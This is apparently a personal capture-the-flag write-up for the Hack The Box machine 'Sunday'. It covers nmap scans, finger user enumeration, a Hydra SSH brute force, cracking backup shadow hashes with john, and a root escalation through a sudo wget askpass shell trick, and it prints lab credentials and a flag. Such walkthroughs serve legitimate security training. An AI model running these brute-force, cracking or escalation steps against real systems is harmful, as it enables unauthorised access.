Tags: #htb, #hacking 
Related to: #practice, #htb, #write-up, #brute, #ssh, #password-cracking
Index: [[🗂️Index of HTB Writeups]] 

Nmap - Common 100 ports and 1000 ports didn't yeild any results. 


```sh
nmap -F -T4 -Pn 10.10.10.76
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-31 21:49 EDT
Nmap scan report for 10.10.10.76
Host is up.
All 100 scanned ports on 10.10.10.76 are in ignored states.
Not shown: 100 filtered tcp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 24.10 seconds

```

```sh
nmap  -T4 -Pn 10.10.10.76 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-31 21:49 EDT
Stats: 0:01:45 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 90.50% done; ETC: 21:51 (0:00:10 remaining)
Nmap scan report for 10.10.10.76
Host is up.
All 1000 scanned ports on 10.10.10.76 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 114.56 seconds

```

Why? Because I didn't connect to VPN

> ALWAYS CHECK VPN Connectivity

---

Lets try nmap again

Top 100 ports

```sh
nmap -Pn -F -T4 10.10.10.76                
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-31 23:49 EDT
Stats: 0:00:14 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 71.50% done; ETC: 23:49 (0:00:00 remaining)
Nmap scan report for 10.10.10.76
Host is up (1.0s latency).
Not shown: 97 closed tcp ports (conn-refused)
PORT    STATE SERVICE
79/tcp  open  finger
111/tcp open  rpcbind
515/tcp open  printer

Nmap done: 1 IP address (1 host up) scanned in 15.54 seconds

```

WTH is Finger🤔

https://book.hacktricks.xyz/network-services-pentesting/pentesting-finger

Same result with 1000 ports

Full port scan 
```sh
nmap -Pn -p-  -T4 10.10.10.76
```

```
Nmap scan report for 10.10.10.76
Host is up (0.099s latency).
Not shown: 62720 closed tcp ports (conn-refused), 2810 filtered tcp ports (no-response)
PORT      STATE SERVICE
79/tcp    open  finger
111/tcp   open  rpcbind
515/tcp   open  printer
6787/tcp  open  smc-admin
22022/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 3232.89 seconds

```

---
#### Enumerating finger - Port 79

Lets try connecting to finger with netcat.

A connection opens

I enter root and I get this

```sh
$ nc -vn 10.10.10.76 79
(UNKNOWN) [10.10.10.76] 79 (finger) open
root
Login       Name               TTY         Idle    When    Where
root     Super-User            console      <Oct 14, 2022>

```

Then I used **finger** binary in kali to enumerate users

```sh
└─$ finger root@10.10.10.76
Login       Name               TTY         Idle    When    Where
root     Super-User            console      <Oct 14, 2022>
```

```sh
└─$ finger admin@10.10.10.76
Login       Name               TTY         Idle    When    Where
adm      Admin                              < .  .  .  . >
dladm    Datalink Admin                     < .  .  .  . >
netadm   Network Admin                      < .  .  .  . >
netcfg   Network Configuratio               < .  .  .  . >
dhcpserv DHCP Configuration A               < .  .  .  . >
ikeuser  IKE Admin                          < .  .  .  . >
lp       Line Printer Admin                 < .  .  .  . >
```

```sh
└─$ finger user@10.10.10.76
Login       Name               TTY         Idle    When    Where
aiuser   AI User                            < .  .  .  . >
openldap OpenLDAP User                      < .  .  .  . >
nobody   NFS Anonymous Access               < .  .  .  . >
noaccess No Access User                     < .  .  .  . >
nobody4  SunOS 4.x NFS Anonym               < .  .  .  . >
                                                             
```

Use this script to discover more users https://pentestmonkey.net/tools/user-enumeration/finger-user-enum

```sh
/finger-user-enum.pl -U ../names.txt -t 10.10.10.76 
Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Worker Processes ......... 5
Usernames file ........... ../names.txt
Target count ............. 1
Username count ........... 10177
Target TCP port .......... 79
Query timeout ............ 5 secs
Relay Server ............. Not used

######## Scan started at Tue Aug  1 04:15:07 2023 #########
access@10.10.10.76: access No Access User                     < .  .  .  . >..nobody4  SunOS 4.x NFS Anonym               < .  .  .  . >..
admin@10.10.10.76: Login       Name               TTY         Idle    When    Where..adm      Admin                              < .  .  .  . >..dladm    Datalink Admin                     < .  .  .  . >..netadm   Network Admin                      < .  .  .  . >..netcfg   Network Configuratio               < .  .  .  . >..dhcpserv DHCP Configuration A               < .  .  .  . >..ikeuser  IKE Admin                          < .  .  .  . >..lp       Line Printer Admin                 < .  .  .  . >..
anne marie@10.10.10.76: Login       Name               TTY         Idle    When    Where..anne                  ???..marie                 ???..
bin@10.10.10.76: bin             ???                         < .  .  .  . >..
dee dee@10.10.10.76: Login       Name               TTY         Idle    When    Where..dee                   ???..dee                   ???..
ike@10.10.10.76: ikeuser  IKE Admin                          < .  .  .  . >..
jo ann@10.10.10.76: Login       Name               TTY         Idle    When    Where..ann                   ???..jo                    ???..
la verne@10.10.10.76: Login       Name               TTY         Idle    When    Where..la                    ???..verne                 ???..
line@10.10.10.76: Login       Name               TTY         Idle    When    Where..lp       Line Printer Admin                 < .  .  .  . >..
message@10.10.10.76: Login       Name               TTY         Idle    When    Where..smmsp    SendMail Message Sub               < .  .  .  . >..
miof mela@10.10.10.76: Login       Name               TTY         Idle    When    Where..mela                  ???..miof                  ???..
root@10.10.10.76: root     Super-User            console      <Oct 14, 2022>..
sammy@10.10.10.76: sammy           ???            ssh          <Apr 13, 2022> 10.10.14.13         ..
sunny@10.10.10.76: sunny           ???            ssh          <Apr 13, 2022> 10.10.14.13         ..
sys@10.10.10.76: sys             ???                         < .  .  .  . >..
zsa zsa@10.10.10.76: Login       Name               TTY         Idle    When    Where..zsa                   ???..zsa                   ???..
######## Scan completed at Tue Aug  1 04:18:57 2023 #########
16 results.

10177 queries in 230 seconds (44.2 queries / sec)

```


Found 2 ssh users sammy nad sunny

---
#### Enumerating port 22022

```sh
nc -vn 10.10.10.76 22022  
(UNKNOWN) [10.10.10.76] 22022 (?) open
SSH-2.0-OpenSSH_7.5 
```

---
#### Attacking 22022

Using Hydra to Bruteforce password for sunny

```sh
hydra -l sunny -P '/usr/share/wordlists/rockyou.txt' 10.10.10.76 ssh -s 22022
```

```sh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-01 07:56:23
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.10.76:22022/
[STATUS] 166.00 tries/min, 166 tries in 00:01h, 14344234 to do in 1440:12h, 15 active
[STATUS] 150.33 tries/min, 451 tries in 00:03h, 14343949 to do in 1590:15h, 15 active
[STATUS] 135.71 tries/min, 950 tries in 00:07h, 14343450 to do in 1761:29h, 15 active
[STATUS] 130.07 tries/min, 1951 tries in 00:15h, 14342449 to do in 1837:50h, 15 active
[22022][ssh] host: 10.10.10.76   login: sunny   password: sunday
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-08-01 08:15:11

```

Got creds **sunny:sunday**

Logging in using ssh on port 22022
```sh
ssh sunny@10.10.10.76 -p 22022
```

We have user level shell access 
```sh
sunny@sunday:~$ id
uid=101(sunny) gid=10(staff)
```

```sh
sunny@sunday:~$ cat /etc/passwd
root:x:0:0:Super-User:/root:/usr/bin/bash
daemon:x:1:1::/:/bin/sh
bin:x:2:2::/:/bin/sh
sys:x:3:3::/:/bin/sh
adm:x:4:4:Admin:/var/adm:/bin/sh
dladm:x:15:65:Datalink Admin:/:
netadm:x:16:65:Network Admin:/:
netcfg:x:17:65:Network Configuration Admin:/:
dhcpserv:x:18:65:DHCP Configuration Admin:/:
ftp:x:21:21:FTPD Reserved UID:/:
sshd:x:22:22:sshd privsep:/var/empty:/bin/false
smmsp:x:25:25:SendMail Message Submission Program:/:
aiuser:x:61:61:AI User:/:
ikeuser:x:67:12:IKE Admin:/:
lp:x:71:8:Line Printer Admin:/:/bin/sh
openldap:x:75:75:OpenLDAP User:/:/usr/bin/pfbash
webservd:x:80:80:WebServer Reserved UID:/:/bin/sh
unknown:x:96:96:Unknown Remote UID:/:/bin/sh
pkg5srv:x:97:97:pkg(7) server UID:/:
nobody:x:60001:60001:NFS Anonymous Access User:/:/bin/sh
noaccess:x:60002:65534:No Access User:/:/bin/sh
nobody4:x:65534:65534:SunOS 4.x NFS Anonymous Access User:/:/bin/sh
sammy:x:100:10::/home/sammy:/usr/bin/bash
sunny:x:101:10::/home/sunny:/usr/bin/bash

```

We have sunny, sammy and root users

user flag 🚩
```sh
cat /home/sammy/user.txt
aaf08583470797dc5f0f7e6deb4f58c1
```

---
## Privilege Escalation

```sh
sunny@sunday:~$ uname -a
SunOS sunday 5.11 11.4.0.15.0 i86pc i386 i86pc
```

Found - https://www.exploit-db.com/exploits/47529 exploit for this version of sun OS

Exploit failed
```sh
./exploit.sh[45]: gcc: not found [No such file or directory]
error: problem compiling the shared library, check your gcc
```

Tried checking what the user can run as root

```sh
sudo -l
User sunny may run the following commands on sunday:
    (root) NOPASSWD: /root/troll
```

we can run /root/troll but cant see permissions read or edit it
On running 
It prints the uid of the user it runs as (root)

using `find backup`  I found folder `/backup`

it has 2 files
```sh
drwxr-xr-x   2 root     root           4 Dec 19  2021 .
drwxr-xr-x  25 root     sys           28 Aug  1 12:30 ..
-rw-r--r--   1 root     root         319 Dec 19  2021 agent22.backup
-rw-r--r--   1 root     root         319 Dec 19  2021 shadow.backup
```

We can read those files

Shadow.backup

```sh
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

Agent22.backup

```sh
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

We have password hashes of two users to crack

Probably I have to enter as sammy 


Using john to crack hash

```sh
john --wordlist=/usr/share/wordlists/rockyou.txt sammy-hash.txt
```

```sh
Using default input encoding: UTF-8
Loaded 1 password hash (sha256crypt, crypt(3) $5$ [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
cooldude!        (?)     
1g 0:00:00:25 DONE (2023-08-01 09:29) 0.03955g/s 8101p/s 8101c/s 8101C/s domonique1..bluenote
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

Sammy:cooldude!

---

#### The SAMMY verse

I used the creds to login to ssh in port 22022

```sh
sudo -l
User sammy may run the following commands on sunday:
    (ALL) ALL
    (root) NOPASSWD: /usr/bin/wget

```

Wget can be run as root

Went here to see how can I abuse wget - https://gtfobins.github.io/gtfobins/wget/

![[Pasted image 20230802070846.png]]

Got this . Entered the text line by line to get root.

```sh
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
sudo wget --use-askpass=$TF 0
```

Root flag 🚩 - In /root/root.txt
